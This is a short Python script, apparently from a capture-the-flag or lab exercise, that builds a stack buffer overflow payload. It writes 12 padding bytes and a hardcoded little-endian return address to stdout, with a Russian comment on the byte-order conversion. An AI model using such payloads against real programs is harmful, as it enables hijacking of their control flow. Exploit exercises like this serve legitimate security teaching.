import sys

offset = 12
target_address = 0x5555555551c9

# Преобразование адреса в little-endian байты
payload = b'A' * offset + target_address.to_bytes(8, byteorder='little')

sys.stdout.buffer.write(payload)